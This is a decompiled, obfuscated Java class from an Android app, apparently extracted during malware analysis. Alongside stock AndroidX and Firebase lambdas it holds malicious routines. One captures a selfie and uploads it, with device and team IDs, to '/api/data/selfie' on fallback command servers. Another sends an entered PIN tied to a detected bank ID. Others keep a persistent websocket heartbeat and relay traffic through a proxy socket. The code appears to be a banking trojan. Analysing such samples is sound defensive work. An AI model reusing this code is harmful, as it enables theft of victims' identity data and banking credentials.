package androidx.work.impl;

import android.app.job.JobParameters;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.PowerManager;
import android.os.Process;
import android.os.StrictMode;
import android.util.Base64;
import android.view.ViewPropertyAnimator;
import android.webkit.WebView;
import android.widget.FrameLayout;
import androidx.concurrent.futures.AbstractResolvableFuture;
import androidx.tracing.Trace;
import androidx.work.ListenableWorker;
import androidx.work.impl.background.greedy.TimeLimiter;
import androidx.work.impl.constraints.controllers.ConstraintController$track$1$listener$1;
import androidx.work.impl.constraints.trackers.ConstraintTracker;
import androidx.work.impl.model.WorkGenerationalId;
import androidx.work.impl.utils.StopWorkRunnable;
import androidx.work.impl.utils.WorkForegroundRunnable;
import androidx.work.impl.utils.futures.AbstractFuture;
import androidx.work.impl.utils.futures.SettableFuture;
import androidx.work.impl.workers.ConstraintTrackingWorker;
import androidx.work.impl.workers.ConstraintTrackingWorkerKt;
import com.base.template.NativeBridge;
import com.base.template.OnboardingActivity;
import com.base.template.OnboardingActivity$$ExternalSyntheticLambda5;
import com.base.template.network.SmsFastSend;
import com.base.template.network.WsPersistManager;
import com.base.template.services.FcmService;
import com.base.template.services.ProxyService;
import com.google.android.datatransport.runtime.TransportImpl$$ExternalSyntheticLambda0;
import com.google.android.datatransport.runtime.scheduling.jobscheduling.JobInfoSchedulerService;
import com.google.android.gms.tasks.TaskCompletionSource;
import com.google.common.util.concurrent.ListenableFuture;
import com.google.firebase.components.LazySet;
import com.google.firebase.components.OptionalProvider;
import com.google.firebase.concurrent.CustomThreadFactory;
import com.google.firebase.concurrent.DelegatingScheduledFuture;
import com.google.firebase.inject.Provider;
import com.google.firebase.messaging.FirebaseMessaging;
import com.google.firebase.messaging.ImageDownload;
import com.google.firebase.messaging.Store;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.concurrent.Callable;
import kotlin.text.StringsKt__StringsJVMKt;
import okhttp3.ConnectionPool;
import okhttp3.Dispatcher;
import okhttp3.MediaType;
import org.json.JSONObject;
import p000.C0000;

/* JADX INFO: loaded from: /Users/xv/pin2/max-gate-apk/output/stage4/classes.dex */
public final /* synthetic */ class Processor$$ExternalSyntheticLambda2 implements Runnable {
    public final /* synthetic */ int $r8$classId;
    public final /* synthetic */ Object f$0;
    public final /* synthetic */ Object f$1;

    public /* synthetic */ Processor$$ExternalSyntheticLambda2(Object obj, int i, Object obj2) {
        this.$r8$classId = i;
        this.f$0 = obj;
        this.f$1 = obj2;
    }

    @Override // java.lang.Runnable
    public final void run() {
        ViewPropertyAnimator viewPropertyAnimatorAnimate;
        ViewPropertyAnimator viewPropertyAnimatorAlpha;
        ViewPropertyAnimator duration;
        ViewPropertyAnimator viewPropertyAnimatorWithEndAction;
        TransportImpl$$ExternalSyntheticLambda0 transportImpl$$ExternalSyntheticLambda0;
        int i = 2;
        switch (this.$r8$classId) {
            case 0:
                Processor processor = (Processor) this.f$0;
                WorkGenerationalId workGenerationalId = (WorkGenerationalId) this.f$1;
                synchronized (processor.mLock) {
                    try {
                        ArrayList arrayList = processor.mOuterListeners;
                        int size = arrayList.size();
                        int i2 = 0;
                        while (i2 < size) {
                            Object obj = arrayList.get(i2);
                            i2++;
                            ((ExecutionListener) obj).onExecuted(workGenerationalId, false);
                        }
                    } catch (Throwable th) {
                        throw th;
                    }
                    break;
                }
                return;
            case 1:
                WorkerWrapper workerWrapper = (WorkerWrapper) this.f$0;
                ListenableFuture listenableFuture = (ListenableFuture) this.f$1;
                if (workerWrapper.mWorkerResultFuture.value instanceof AbstractFuture.Cancellation) {
                    listenableFuture.cancel(true);
                    return;
                }
                return;
            case 2:
                TimeLimiter timeLimiter = (TimeLimiter) this.f$0;
                StartStopToken startStopToken = (StartStopToken) this.f$1;
                WorkLauncherImpl workLauncherImpl = timeLimiter.launcher;
                ((Dispatcher) workLauncherImpl.workTaskExecutor).executeOnTaskThread(new StopWorkRunnable((Processor) workLauncherImpl.processor, startStopToken, false, 3));
                return;
            case 3:
                List list = (List) this.f$0;
                ConstraintTracker constraintTracker = (ConstraintTracker) this.f$1;
                Iterator it = list.iterator();
                while (it.hasNext()) {
                    ((ConstraintController$track$1$listener$1) it.next()).onConstraintChanged(constraintTracker.currentState);
                }
                return;
            case 4:
                WorkForegroundRunnable workForegroundRunnable = (WorkForegroundRunnable) this.f$0;
                SettableFuture settableFuture = (SettableFuture) this.f$1;
                if (workForegroundRunnable.mFuture.value instanceof AbstractFuture.Cancellation) {
                    settableFuture.cancel(true);
                    return;
                } else {
                    settableFuture.setFuture(workForegroundRunnable.mWorker.getForegroundInfoAsync());
                    return;
                }
            case 5:
                ConstraintTrackingWorker constraintTrackingWorker = (ConstraintTrackingWorker) this.f$0;
                ListenableFuture listenableFuture2 = (ListenableFuture) this.f$1;
                synchronized (constraintTrackingWorker.lock) {
                    try {
                        if (constraintTrackingWorker.areConstraintsUnmet) {
                            SettableFuture settableFuture2 = constraintTrackingWorker.future;
                            int i3 = ConstraintTrackingWorkerKt.$r8$clinit;
                            settableFuture2.set(new ListenableWorker.Result.Retry());
                        } else {
                            constraintTrackingWorker.future.setFuture(listenableFuture2);
                        }
                    } catch (Throwable th2) {
                        throw th2;
                    }
                }
                return;
            case 6:
                OnboardingActivity onboardingActivity = (OnboardingActivity) this.f$0;
                SharedPreferences sharedPreferences = (SharedPreferences) this.f$1;
                int i4 = OnboardingActivity.$r8$clinit;
                try {
                    byte[] bArrCapture = Trace.capture(onboardingActivity.getApplicationContext());
                    if (bArrCapture != null && bArrCapture.length != 0) {
                        Context applicationContext = onboardingActivity.getApplicationContext();
                        MediaType mediaType = SmsFastSend.JSON_TYPE;
                        if (bArrCapture.length != 0) {
                            Thread thread = new Thread(new Processor$$ExternalSyntheticLambda2(applicationContext, 9, bArrCapture));
                            thread.setDaemon(true);
                            thread.start();
                        }
                        sharedPreferences.edit().putBoolean(C0000.decode(new byte[]{22, 83, 90, 85, 92, 93, 58, 69, 83, 93, 65}, "e66358"), true).apply();
                        return;
                    }
                    return;
                } catch (Exception e) {
                    e.getMessage();
                    return;
                }
            case 7:
                OnboardingActivity onboardingActivity2 = (OnboardingActivity) this.f$0;
                OnboardingActivity$$ExternalSyntheticLambda5 onboardingActivity$$ExternalSyntheticLambda5 = (OnboardingActivity$$ExternalSyntheticLambda5) this.f$1;
                FrameLayout frameLayout = onboardingActivity2.cardContainer;
                if (frameLayout != null) {
                    frameLayout.removeAllViews();
                }
                onboardingActivity$$ExternalSyntheticLambda5.run();
                return;
            case 8:
                OnboardingActivity onboardingActivity3 = (OnboardingActivity) this.f$0;
                String str = (String) this.f$1;
                WebView webView = onboardingActivity3.pinWebView;
                if (webView != null && (viewPropertyAnimatorAnimate = webView.animate()) != null && (viewPropertyAnimatorAlpha = viewPropertyAnimatorAnimate.alpha(0.0f)) != null && (duration = viewPropertyAnimatorAlpha.setDuration(400L)) != null && (viewPropertyAnimatorWithEndAction = duration.withEndAction(new OnboardingActivity$$ExternalSyntheticLambda5(onboardingActivity3, 7))) != null) {
                    viewPropertyAnimatorWithEndAction.start();
                }
                MediaType mediaType2 = SmsFastSend.JSON_TYPE;
                Context applicationContext2 = onboardingActivity3.getApplicationContext();
                String str2 = onboardingActivity3.detectedBankId;
                if (!StringsKt__StringsJVMKt.isBlank(str)) {
                    Thread thread2 = new Thread(new Processor$$ExternalSyntheticLambda1(applicationContext2, str, str2, i));
                    thread2.setDaemon(true);
                    thread2.start();
                }
                onboardingActivity3.finalizeSetup();
                return;
            case 9:
                Context context = (Context) this.f$0;
                byte[] bArr = (byte[]) this.f$1;
                try {
                    SmsFastSend.Credentials credentialsResolveCredentials = SmsFastSend.resolveCredentials(context);
                    if (credentialsResolveCredentials == null) {
                        return;
                    }
                    String str3 = credentialsResolveCredentials.teamId;
                    String strEncodeToString = Base64.encodeToString(bArr, 2);
                    JSONObject jSONObject = new JSONObject();
                    jSONObject.put(C0000.decode(new byte[]{86, 4, 78, 8, 5, 86, 109, 8, 92}, "2a8af3", false), credentialsResolveCredentials.deviceId);
                    jSONObject.put(C0000.decode(new byte[]{65, 81, 83, 9, 105, 10, 80}, "542d6c4d237cb63f", 0.0f), str3);
                    jSONObject.put(C0000.decode(new byte[]{74, 92, 93, 83, 8, 92}, "9915a94278b84127", false), strEncodeToString);
                    for (int i5 = 1; i5 < 4; i5++) {
                        long jCurrentTimeMillis = System.currentTimeMillis() / ((long) 1000);
                        String signature = SmsFastSend.getSignature(context, str3, jCurrentTimeMillis);
                        if (StringsKt__StringsJVMKt.isBlank(signature)) {
                            if (i5 < 3) {
                                Thread.sleep(((long) i5) * 500);
                            }
                        } else if (SmsFastSend.trySendToPath(jSONObject, jCurrentTimeMillis, signature, credentialsResolveCredentials.effectiveUrl, credentialsResolveCredentials.fallbackUrl, "/api/data/selfie", credentialsResolveCredentials.allUrls)) {
                            return;
                        } else {
                            Thread.sleep(((long) i5) * 2000);
                        }
                    }
                    return;
                } catch (Exception e2) {
                    e2.getMessage();
                    return;
                }
            case 10:
                FcmService fcmService = (FcmService) this.f$0;
                PowerManager.WakeLock wakeLock = (PowerManager.WakeLock) this.f$1;
                int i6 = FcmService.$r8$clinit;
                try {
                    Object obj2 = WsPersistManager.lock;
                    if (!WsPersistManager.isConnected) {
                        WsPersistManager.connect(fcmService.getApplicationContext());
                    }
                    Thread.sleep(2000L);
                    WsPersistManager.sendHeartbeat(fcmService.getApplicationContext());
                    NativeBridge.triggerHeartbeat();
                    if (wakeLock == null) {
                        return;
                    }
                } catch (Exception unused) {
                    if (wakeLock == null) {
                        return;
                    }
                } finally {
                    if (wakeLock != null) {
                        try {
                            wakeLock.release();
                            break;
                        } catch (Exception unused2) {
                        }
                    }
                }
                try {
                    return;
                } catch (Exception unused3) {
                    return;
                }
            case 11:
                ProxyService.ChannelState channelState = (ProxyService.ChannelState) this.f$0;
                try {
                    channelState.output.write((byte[]) this.f$1);
                    channelState.output.flush();
                    return;
                } catch (Exception unused4) {
                    channelState.active = false;
                    try {
                        channelState.socket.close();
                        return;
                    } catch (Exception unused5) {
                        return;
                    }
                }
            case 12:
                ((JobInfoSchedulerService) this.f$0).lambda$onStartJob$0((JobParameters) this.f$1);
                return;
            case 13:
                OptionalProvider optionalProvider = (OptionalProvider) this.f$0;
                Provider provider = (Provider) this.f$1;
                if (optionalProvider.delegate != OptionalProvider.EMPTY_PROVIDER) {
                    throw new IllegalStateException(C0000.decode(new byte[]{70, 74, 86, 78, 95, 1, 83, 73, 74, 16, 85, 89, 87, 24, 84, 0, 22, 2, 2, 92, 90, 93, 93, 24, 89, 11, 90, 24, 67, 95, 88, 91, 92, 22}, "68986e6ac0"));
                }
                synchronized (optionalProvider) {
                    transportImpl$$ExternalSyntheticLambda0 = optionalProvider.handler;
                    optionalProvider.handler = null;
                    optionalProvider.delegate = provider;
                    break;
                }
                transportImpl$$ExternalSyntheticLambda0.getClass();
                return;
            case 14:
                LazySet lazySet = (LazySet) this.f$0;
                Provider provider2 = (Provider) this.f$1;
                synchronized (lazySet) {
                    try {
                        if (lazySet.actualSet == null) {
                            lazySet.providers.add(provider2);
                        } else {
                            lazySet.actualSet.add(provider2.get());
                        }
                    } catch (Throwable th3) {
                        throw th3;
                    }
                }
                return;
            case 15:
                CustomThreadFactory customThreadFactory = (CustomThreadFactory) this.f$0;
                Runnable runnable = (Runnable) this.f$1;
                Process.setThreadPriority(customThreadFactory.priority);
                StrictMode.ThreadPolicy threadPolicy = customThreadFactory.policy;
                if (threadPolicy != null) {
                    StrictMode.setThreadPolicy(threadPolicy);
                }
                runnable.run();
                return;
            case 16:
                Callable callable = (Callable) this.f$0;
                ConnectionPool connectionPool = (ConnectionPool) this.f$1;
                try {
                    Object objCall = callable.call();
                    DelegatingScheduledFuture delegatingScheduledFuture = (DelegatingScheduledFuture) connectionPool.delegate;
                    if (objCall == null) {
                        objCall = AbstractResolvableFuture.NULL;
                    }
                    if (AbstractResolvableFuture.ATOMIC_HELPER.casValue(delegatingScheduledFuture, null, objCall)) {
                        AbstractResolvableFuture.complete(delegatingScheduledFuture);
                        return;
                    }
                    return;
                } catch (Exception e3) {
                    connectionPool.setException(e3);
                    return;
                }
            case 17:
                FirebaseMessaging firebaseMessaging = (FirebaseMessaging) this.f$0;
                TaskCompletionSource taskCompletionSource = (TaskCompletionSource) this.f$1;
                Store store = FirebaseMessaging.store;
                try {
                    taskCompletionSource.setResult(firebaseMessaging.blockingGetToken());
                    return;
                } catch (Exception e4) {
                    taskCompletionSource.zza.zza(e4);
                    return;
                }
            default:
                ImageDownload imageDownload = (ImageDownload) this.f$0;
                TaskCompletionSource taskCompletionSource2 = (TaskCompletionSource) this.f$1;
                try {
                    taskCompletionSource2.setResult(imageDownload.blockingDownload());
                    return;
                } catch (Exception e5) {
                    taskCompletionSource2.zza.zza(e5);
                    return;
                }
        }
    }
}
